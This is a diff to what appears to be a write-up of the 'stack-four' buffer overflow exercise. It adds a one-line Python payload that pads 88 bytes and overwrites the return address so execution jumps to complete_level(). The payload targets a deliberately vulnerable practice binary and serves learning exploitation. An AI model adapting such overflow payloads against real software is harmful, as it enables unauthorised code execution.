@@ -44,6 +44,11 @@ int main(int argc, char **argv) {
 }
 ```
 
+## Payload
+```bash
+$ python3 -c "print('A' * 88 + '\x1d\x06\x40')" | ./stack-four
+```
+
 ## Solution
 
 - Now this is getting even more interesting! We still have the `complete_level()` function which is probably still our target of our buffer overflows. The program starts off by calling `start_level()` so we will focus our attention there.
